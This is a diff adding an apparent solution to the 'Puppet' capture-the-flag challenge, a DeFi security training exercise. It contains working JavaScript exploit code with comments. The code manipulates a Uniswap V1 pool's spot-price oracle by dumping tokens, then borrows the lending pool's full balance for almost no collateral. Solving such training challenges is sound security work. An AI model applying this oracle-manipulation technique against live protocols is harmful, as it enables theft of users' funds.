@@ -103,6 +103,43 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /**
+         * Starting with a Uniswap V1 pool, placed 10ETH/10DVT.=> 1 ETH = 1 DVT.
+         * 
+         * Scenario:
+         *  -> Price of the token is calculated in wei, given as:
+         *       ETH balance of the pool / DVT balance of the pool
+         *  -> As attacker, we have 1k DVT tokens and 25 ETH. Our aim is minimizing the
+         *  value returned from the _computeOraclePrice(), either infimum of 0 or such a value that 
+         *  can be ignored.(Epsilon)
+         *  -> Drain the uniswap pair by swapping 10 - E,E is Epsilon, DVT to ETH. Now pair has balances that will yield fail during the calculation of oracle price(More DVT tokens than ETH).
+         *  -> Explaination about the oracle distruption:
+         *  -> uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+         *     ^^^^^(1)^^^^^^^^^^^                ^^^^^^^^^^^^^^(2)^^^^^^^^^^^
+         *  -> Since the oracle uses integer division, at the moment where (2) > (1), oracle will
+         *  return 0. 
+         *  Read this also:https://hackmd.io/@HaydenAdams/HJ9jLsfTz
+         *  HOW:https://docs.uniswap.org/protocol/V1/reference/interfaces, call tokenToEthSwap.
+         *  -> Oracle returns 0 as DVT price.
+         *  -> Drain all the funds in the pool by calling borrow.
+         * 
+         */
+        
+        //approve for arbitrary amount.
+        //approve less than the initial balance so that at the end 
+        //we will have more funds than the pool.
+        const attackAmount = ATTACKER_INITIAL_TOKEN_BALANCE.sub(10000);
+        await this.token.connect(attacker).approve(this.uniswapExchange.address,attackAmount);
+
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            attackAmount,
+            1,
+            (await ethers.provider.getBlock('latest')).timestamp + 10 //also completely arbitrary.
+        );
+
+        const sendCollateral = await this.lendingPool.connect(attacker).calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE,{value:sendCollateral});
     });
 
     after(async function () {
